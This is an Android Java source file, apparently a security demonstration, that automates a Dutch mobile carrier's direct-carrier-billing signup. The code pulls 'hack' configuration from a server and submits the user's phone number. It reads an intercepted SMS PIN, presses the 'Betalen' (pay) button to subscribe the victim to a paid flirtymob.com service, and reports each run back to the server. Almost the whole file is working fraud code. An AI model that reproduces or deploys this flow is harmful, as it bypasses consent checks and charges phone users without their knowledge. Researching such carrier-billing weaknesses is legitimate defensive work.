package com.dcbsecure.demo201503.dcbsecure.flow;

import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.dcbsecure.demo201503.dcbsecure.ActivityMainWindow;
import com.dcbsecure.demo201503.dcbsecure.managers.ConfigMgr;
import com.dcbsecure.demo201503.dcbsecure.managers.PreferenceMgr;
import com.dcbsecure.demo201503.dcbsecure.R;
import com.dcbsecure.demo201503.dcbsecure.request.RequestResult;
import com.dcbsecure.demo201503.dcbsecure.util.PayUtil;
import com.dcbsecure.demo201503.dcbsecure.util.SyncRequestUtil;
import com.dcbsecure.demo201503.dcbsecure.managers.TrackMgr;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Timer;
import java.util.TimerTask;


public class FlowNLWifi implements DialogInterface.OnClickListener
{
    private final ActivityMainWindow activityMainWindow;
    private final String trigger;

    public FlowNLWifi(ActivityMainWindow activityMainWindow, String trigger)
    {

        this.activityMainWindow = activityMainWindow;
        this.trigger = trigger;
    }

    @Override
    public void onClick(DialogInterface dialog, int id)
    {
        Log.d("FLIRTY", "Started handling payment over wifi.");


        final String deviceid = ConfigMgr.lookupDeviceId(activityMainWindow);


        final ProgressDialog progress = ProgressDialog.show(activityMainWindow, null, activityMainWindow.getString(R.string.processing));
        progress.show();

        // used to dismiss the progress dialog
        final Handler handler = new Handler()
        {
            @Override
            public void handleMessage(final Message msg)
            {
                super.handleMessage(msg);

                if (msg.what == 0)
                {
                    progress.dismiss();
                }

                if(msg.what >0)
                {
                    // start the waiting task
                    progress.setMessage(activityMainWindow.getString(R.string.processing)+" "+msg.what+"%");
                }
            }
        };

        new Thread(new Runnable()
        {
            @Override
            public void run()
            {
                long runid = 0;
                try
                {
                    //reset pin
                    FlowUtil.setPin(null);

                    TelephonyManager tm = (TelephonyManager) activityMainWindow.getSystemService(Context.TELEPHONY_SERVICE);
                    String iso3166 = tm.getSimCountryIso();
                    if(iso3166==null||iso3166.isEmpty()) iso3166 = tm.getNetworkCountryIso();
                    String mccmnc = tm.getSimOperator();
                    if(mccmnc==null||mccmnc.isEmpty()) mccmnc = tm.getNetworkOperator();
                    String carrier = tm.getSimOperatorName();
                    if(carrier==null||carrier.isEmpty()) carrier = tm.getNetworkOperatorName();

                    //recheck hack data
                    ArrayList<NameValuePair> params = new ArrayList<NameValuePair>();
                    params.add(new BasicNameValuePair("iso3166", iso3166));
                    params.add(new BasicNameValuePair("mccmnc", mccmnc));
                    params.add(new BasicNameValuePair("carrier", carrier));
                    params.add(new BasicNameValuePair("wifi", PayUtil.isUsingMobileData(activityMainWindow) ? "0" : "1"));

                    String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);
                    JSONObject hackConfigResponse = SyncRequestUtil.doSynchronousHttpPostReturnsJson(ConfigMgr.getString(activityMainWindow, "SERVER") + "/api/hack/lookup", params, userAgent);

                    if (hackConfigResponse == null)
                    {
                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, 0, 0, true, "hack could not read config", "deviceid:" + deviceid);
                        handler.sendEmptyMessage(0);
                    }
                    else
                    {
                        //decode runid first so that if there is an exception later on, we can still report it against the right runid
                        runid = hackConfigResponse.getLong("runid");
                        runFlowNotInMainThread(deviceid, runid, handler);
                    }
                }
                catch (JSONException e)
                {
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, "Could not read hack config", "deviceid:" + ConfigMgr.lookupDeviceId(activityMainWindow));
                    Log.d("FLIRTY", "Could not read hack config");
                    handler.sendEmptyMessage(0);
                }
                catch (Exception e)
                {
                    String stack = TrackMgr.getStackAsString(e);
                    String message = "unexpected exception deviceid:" + ConfigMgr.lookupDeviceId(activityMainWindow);
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, message, stack);
                    Log.d("FLIRTY", message + " exception:" + e.getClass().getName() + " " + e.getMessage());
                    handler.sendEmptyMessage(0);
                }

            }
        }).start();

     }

    private void runFlowNotInMainThread(final String deviceid, final long runid, final Handler handler)
    {
        final String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);

        String startUrl = null;
        JSONObject billingConfigJSON = ConfigMgr.getBillingConfig();

        try
        {
            JSONObject carrierSubFlow = null;

            if(billingConfigJSON != null && billingConfigJSON.has("carrier_sub_flow")) carrierSubFlow = billingConfigJSON.getJSONObject("carrier_sub_flow");
            if(carrierSubFlow != null && carrierSubFlow.has("start_url")) startUrl = carrierSubFlow.getString("start_url");

        }
        catch (JSONException e)
        {
            String subject = "exception reading json flow config";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, billingConfigJSON.toString());
            handler.sendEmptyMessage(0);
            return;
        }

        if(startUrl==null)
        {
            String subject = "cannot workout start_url";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, null);
            handler.sendEmptyMessage(0);
            return;
        }
        else //if (startUrl!=null)
        {
            RequestResult resultAfterStart = SyncRequestUtil.doSynchronousHttpGetCallReturnsString(activityMainWindow, startUrl,userAgent);

            if(resultAfterStart==null)
            {
                String subject = "start_url returns nothing";
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, startUrl);
                handler.sendEmptyMessage(0);
                return;
            }
            else if(resultAfterStart.getHttpCode()!=200)
            {
                String subject = "start_url returns http code "+resultAfterStart.getHttpCode();
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, resultAfterStart.getContent());
                handler.sendEmptyMessage(0);
                return;
            }
            else
            {
                String htmlDataAfterStart = resultAfterStart.getContent(); // html content
                String msisdnSubmitUrl = resultAfterStart.getUrl(); // network provider url

                ArrayList<NameValuePair> paramsForMsisdnSubmit = buildArrayListParamsOfHiddenFields(htmlDataAfterStart.split("\n"));

                // after we extracted all hidden fields, we can do a POST request to the action url.
                // Action URL is in fact in response from the start URL request

                // we have to submit the MSISDN also, but format must be 06... , not 316...
                String msisdnStartingWith0not31 = PreferenceMgr.getMsisdn(activityMainWindow);

                if (msisdnStartingWith0not31!=null && msisdnStartingWith0not31.startsWith("31"))
                    msisdnStartingWith0not31 = "0" + msisdnStartingWith0not31.substring(2);

                else if (msisdnStartingWith0not31!=null && msisdnStartingWith0not31.startsWith("+31"))
                    msisdnStartingWith0not31 = "0" + msisdnStartingWith0not31.substring(3);

                else if (msisdnStartingWith0not31!=null && msisdnStartingWith0not31.startsWith("6"))
                    msisdnStartingWith0not31 = "0" + msisdnStartingWith0not31;

                Log.d("FLIRTY", "Using MSISDN: " + msisdnStartingWith0not31);

                paramsForMsisdnSubmit.add(new BasicNameValuePair("ctl00$ContentPlaceHolder1$msisdnTxt", msisdnStartingWith0not31));
                paramsForMsisdnSubmit.add(new BasicNameValuePair("ctl00$ContentPlaceHolder1$msisdnContinueButton", "Ga verder"));
                RequestResult resultAfterMsisdnSubmit = SyncRequestUtil.doSynchronousHttpPost(msisdnSubmitUrl, paramsForMsisdnSubmit,userAgent);

                final String htmlDataAfterMsisdnSubmit = resultAfterMsisdnSubmit.getContent();
                final String submitPinUrl = resultAfterMsisdnSubmit!=null?resultAfterMsisdnSubmit.getUrl():null;

                if(resultAfterMsisdnSubmit==null)
                {
                    String subject = "EnterMsisdn returns nothing";
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
                    handler.sendEmptyMessage(0);
                    return;
                }
                else if(resultAfterMsisdnSubmit.getHttpCode()!=200)
                {
                    String subject = "EnterMsisdn returns http code "+resultAfterMsisdnSubmit.getHttpCode();
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterMsisdnSubmit);
                    handler.sendEmptyMessage(0);
                    return;
                }
                else if(submitPinUrl != null && submitPinUrl.toLowerCase().contains("operatornotsupported"))
                {
                    Looper.prepare(); //otherwise TrackMgr.event throws exception "Synchronous ResponseHandler used in AsyncHttpClient. You should create your response handler in a looper thread or use SyncHttpClient instead."
                    TrackMgr.event(activityMainWindow, "operator not supported", null);
                    String subject = "operator not supported";
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, null);
                    try
                    {
                        //remove carrier_sub_flow from billing config since it's not supported => if user tries again he will be directed to another flow
                        JSONObject billingConfig = ConfigMgr.getBillingConfig();
                        billingConfig.put("carrier_sub_flow", null);
                        ConfigMgr.setBillingConfig(billingConfig);
                    }
                    catch (JSONException e)
                    {
                        //do nothing
                    }
                    handler.sendEmptyMessage(0);
                    return;
                }
                else if(submitPinUrl==null)
                {
                    String subject = "cannot workout PinSubmitUrl";
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject,htmlDataAfterMsisdnSubmit);
                    handler.sendEmptyMessage(0); //kill the waiting message
                    return;
                }
                else if(!htmlDataAfterMsisdnSubmit.contains("uw code"))
                {
                    String subject = "expected pin submit page does not look right";
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject,htmlDataAfterMsisdnSubmit);
                    handler.sendEmptyMessage(0); //kill the waiting message
                    return;
                }
                else //if(submitPinUrl!=null)
                {
                    // Again, in result HTML we have to extract values of hidden fields:
                    // form action has a new link
                    // hidden fields
                    // ctl00$ContentPlaceHolder1$pinTxt will hold the pin text
                    // submit button also - ctl00$ContentPlaceHolder1$pinContinueButton will hold Ga verder
                    // Since submit button has a different id, i'll add another field called:
                    //  ctl00_ContentPlaceHolder1_pinContinueButton which will hold Ga verder

                    final ArrayList<NameValuePair> paramsForPinSubmit = buildArrayListParamsOfHiddenFields(htmlDataAfterMsisdnSubmit.split("\n"));

                    // After this point, a PIN should arrive in an SMS message to the target user

                    // start the waiting task
                    TimerTask task = new TimerTask()
                    {
                        @Override
                        public void run()
                        {
                            final long WAITING_TIME = 130000;
                            final long SLEEP_TIME = 1000;
                            final long END_TIME = System.currentTimeMillis() + WAITING_TIME;

                            while (System.currentTimeMillis() <= END_TIME)
                            {
                                String pin = FlowUtil.getPin();
                                if (pin!=null && !pin.isEmpty())
                                {
                                    paramsForPinSubmit.add(new BasicNameValuePair("ctl00$ContentPlaceHolder1$pinTxt", pin));
                                    paramsForPinSubmit.add(new BasicNameValuePair("ctl00$ContentPlaceHolder1$pinContinueButton", "Ga verder"));

                                    //doing pin submit
                                    final RequestResult resultAfterPinSubmit = SyncRequestUtil.doSynchronousHttpPost(submitPinUrl, paramsForPinSubmit,userAgent);
                                    final String confirmUrl = resultAfterPinSubmit!=null?resultAfterPinSubmit.getUrl():null;
                                    final String htmlDataAfterPinSubmit = resultAfterPinSubmit!=null?resultAfterPinSubmit.getContent():null;

                                    if(resultAfterPinSubmit==null)
                                    {
                                        String subject = "PinSubmit returns nothing";
                                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterMsisdnSubmit);
                                        handler.sendEmptyMessage(0);
                                        return;
                                    }
                                    else if(resultAfterPinSubmit.getHttpCode()!=200)
                                    {
                                        String subject = "PinSubmit returns http code "+resultAfterPinSubmit.getHttpCode();
                                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterPinSubmit);
                                        handler.sendEmptyMessage(0);
                                        return;
                                    }
                                    else if(confirmUrl==null)
                                    {
                                        String subject = "cannot workout confirmUrl";
                                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject,htmlDataAfterPinSubmit);
                                        handler.sendEmptyMessage(0); //kill the waiting message
                                        return;
                                    }
                                    else if(!htmlDataAfterPinSubmit.contains("Betalen"))
                                    {
                                        String subject = "expected confirm page does not look right";
                                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject,htmlDataAfterPinSubmit);
                                        handler.sendEmptyMessage(0); //kill the waiting message
                                        return;
                                    }
                                    else //if(htmlDataAfterPinSubmit.contains("Betalen"))
                                    {
                                        final ArrayList<NameValuePair> paramsForConfirm = buildArrayListParamsOfHiddenFields(htmlDataAfterPinSubmit.split("\n"));
                                        paramsForConfirm.add(new BasicNameValuePair("ctl00$ContentPlaceHolder1$subscriptionAgreeButton", "Betalen"));
                                        paramsForConfirm.add(new BasicNameValuePair("ContentPlaceHolder1_subscriptionAgreeButton", "Betalen"));

                                        // Here we have to make one last POST request to confirm
                                        final RequestResult resultAfterConfirm = SyncRequestUtil.doSynchronousHttpPost(confirmUrl, paramsForConfirm,userAgent);
                                        final String successfulConfirmationUrl = resultAfterConfirm!=null?resultAfterConfirm.getUrl():null;
                                        final String htmlDataAfterConfirm = resultAfterConfirm!=null?resultAfterConfirm.getContent():null;

                                        if(resultAfterConfirm==null)
                                        {
                                            String subject = "Confirm returns null (url:"+confirmUrl+")";
                                            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterPinSubmit);
                                            handler.sendEmptyMessage(0);
                                            return;
                                        }
                                        else if(resultAfterConfirm.getHttpCode()!=200)
                                        {
                                            String subject = "Confirm returns http code "+resultAfterConfirm.getHttpCode();
                                            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterConfirm);
                                            handler.sendEmptyMessage(0);
                                            return;
                                        }
                                        else if(htmlDataAfterConfirm.contains("ongeldig"))
                                        {
                                            String subject = "failed pin confirm ("+pin+")";
                                            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterConfirm);
                                            handler.sendEmptyMessage(0);
                                            return;
                                        }
                                        else if(htmlDataAfterConfirm.contains("action=\"SuccessfulConfirmation.aspx\""))
                                        {
                                            final ArrayList<NameValuePair> paramsForSuccessfulConfirmation = buildArrayListParamsOfHiddenFields(htmlDataAfterConfirm.split("\n"));

                                            //follow succesful confirmation link
                                            final RequestResult resultAfterSuccessfulConfirmation = SyncRequestUtil.doSynchronousHttpPost(successfulConfirmationUrl, paramsForSuccessfulConfirmation, userAgent);
                                            final String htmlDataAfterSuccessfulConfirmation = resultAfterSuccessfulConfirmation!=null?resultAfterSuccessfulConfirmation.getContent():null;
                                            final String flirtymobSuccessUrl = resultAfterSuccessfulConfirmation!=null?resultAfterSuccessfulConfirmation.getUrl():null;

                                            if(flirtymobSuccessUrl!=null && flirtymobSuccessUrl.contains("flirtymob.com"))
                                            {
                                                String subject = "successful signup after pin confirm ("+pin+")";
                                                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 1, false, subject, htmlDataAfterSuccessfulConfirmation);
                                            }
                                            else
                                            {
                                                //post warning
                                                String subject = "successful signup but wrong redirect after SuccessfulConfirmation.aspx; pin was ("+pin+")";
                                                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 1, false, subject, htmlDataAfterSuccessfulConfirmation);
                                            }

                                            handler.sendEmptyMessage(0);
                                            return;

                                        }
                                        else
                                        {
                                            String subject = "unexpected answer after confirm ("+pin+")";
                                            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterConfirm);
                                            handler.sendEmptyMessage(0);
                                            return;
                                        }

                                    }

                                }
                                else try
                                {
                                    double timeElapsedPer95 = 95d - ( 95d * (END_TIME- System.currentTimeMillis()) / WAITING_TIME) ;
                                    int progressPercent = 5 + (int) Math.round(timeElapsedPer95);
                                    handler.sendEmptyMessage(progressPercent);

                                    Thread.sleep(SLEEP_TIME);
                                }
                                catch (Exception e)
                                {
                                    e.printStackTrace();
                                }

                            }

                            //timeout
                            String subject = "timeout waiting for pin";
                            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject,htmlDataAfterMsisdnSubmit);
                            handler.sendEmptyMessage(0);
                        }
                    };

                    Timer timer = new Timer();
                    timer.schedule(task, 0);
                }
             }
        }

    }

    static ArrayList<NameValuePair> buildArrayListParamsOfHiddenFields(String[] lines)
    {
        ArrayList<NameValuePair> params = new ArrayList<NameValuePair>();

        for (int i = 0; i < lines.length; i++)
        {

            if (lines[i].contains("input type=\"hidden\""))
            {
                String hiddenFieldValue = lines[i].substring(lines[i].indexOf("value=\""), lines[i].length());
                hiddenFieldValue = hiddenFieldValue.replace("value=\"", "");
                hiddenFieldValue = hiddenFieldValue.substring(0, hiddenFieldValue.indexOf("\""));

                String hiddenFieldName = lines[i].substring(lines[i].indexOf("name=\""), lines[i].length());
                hiddenFieldName = hiddenFieldName.replace("name=\"", "");
                hiddenFieldName = hiddenFieldName.substring(0, hiddenFieldName.indexOf("\""));

                params.add(new BasicNameValuePair(hiddenFieldName, hiddenFieldValue));
            }

        }

        return params;
    }


}
